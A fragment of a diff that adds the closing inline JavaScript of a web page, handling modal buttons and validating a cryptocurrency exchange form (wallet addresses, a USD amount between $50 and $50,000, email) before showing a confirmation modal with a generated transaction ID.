+      if (closeBitcoinBtn) closeBitcoinBtn.addEventListener('click', () => closeBitcoinModal(true));
+      if (bitcoinFooterCancel) bitcoinFooterCancel.addEventListener('click', () => closeBitcoinModal(true));
+      
+      function handleEngineModalClose() {
+        if (engineModal.classList.contains('active')) {
+          if (processingTimer) { clearTimeout(processingTimer); processingTimer = null; }
+          closeEngineModal();
+        }
+      }
+      if (closeModalBtn) closeModalBtn.addEventListener('click', handleEngineModalClose);
+      if (footerCloseBtn) footerCloseBtn.addEventListener('click', handleEngineModalClose);
+      if (minimizeBtn) minimizeBtn.addEventListener('click', toggleMinimize);
+      
+      form.addEventListener('submit', function(e) {
+        e.preventDefault();
+        const fromCurrency = document.getElementById('fromCurrency').value;
+        const toCurrency = document.getElementById('toCurrency').value;
+        const sendAddress = document.getElementById('sendAddress').value.trim();
+        const receiveAddress = document.getElementById('receiveAddress').value.trim();
+        const usdAmount = document.getElementById('usdAmount').value.trim();
+        const email = document.getElementById('email').value.trim();
+        const note = document.getElementById('note').value.trim();
+        
+        if (!sendAddress || !isValidWallet(sendAddress)) {
+          showMessage('❌ Please enter a valid sending wallet address (minimum 10 characters, no spaces).', true);
+          return;
+        }
+        if (!receiveAddress || !isValidWallet(receiveAddress)) {
+          showMessage('❌ Please enter a valid receiving wallet address.', true);
+          return;
+        }
+        if (!isValidAmount(usdAmount)) {
+          showMessage('❌ Amount must be between $50 and $50,000 USD.', true);
+          return;
+        }
+        if (!email || !email.includes('@') || !email.includes('.')) {
+          showMessage('❌ Please enter a valid email address.', true);
+          return;
+        }
+        
+        const uniqueTxId = generateUniqueTxId();
+        const formData = {
+          fromCurrency,
+          toCurrency,
+          sendAddress,
+          receiveAddress,
+          usdAmount: parseFloat(usdAmount),
+          email,
+          note: note || '—'
+        };
+        showBitcoinModal(formData, uniqueTxId);
+      });
+      
+      refreshBitcoinModalContent();
+    })();
+  </script>
+</body>
+</html>
